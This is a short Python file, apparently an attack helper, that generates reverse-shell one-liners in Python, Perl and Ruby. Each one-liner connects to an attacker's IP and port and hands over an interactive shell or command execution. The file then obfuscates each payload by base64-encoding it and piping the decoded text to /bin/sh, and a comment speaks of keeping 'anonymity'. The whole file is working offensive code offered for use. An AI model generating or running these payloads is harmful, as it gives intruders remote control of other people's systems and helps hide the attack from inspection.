import base64

class target:
    def pyshell(ip, port, program):
        cmd = f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{ip}",{port}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["{program}","-i"]);'"""

        return b64formatter(encoder(cmd))
    
    def perlshell(ip, port, program): ## use {{ }} - double braces, to esacpe {}
        cmd_1 = """perl -e 'use Socket;
$i="{ip}";
$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");
exec("{prog} -i");}};'
""".format(ip = ip, port = port, prog = program)
        ## random choose which way to resolve to keep anonymity
        

        # encoding, then formatting and returning b64 encoded command
        return b64formatter(encoder(cmd_1))
    
    def rubyshell(ip, port, program): ## not a full interactive shell
        cmd_1 = """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");
while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'
""".format(ip, port)

        return b64formatter(encoder(cmd_1))

        


def encoder(plaintext):
    sample_string = plaintext
    sample_string_bytes = sample_string.encode("ascii")
    
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    
    return base64_string

def b64formatter(encoded):
    cmd = f"echo {encoded} | base64 --decode | /bin/sh"
    return cmd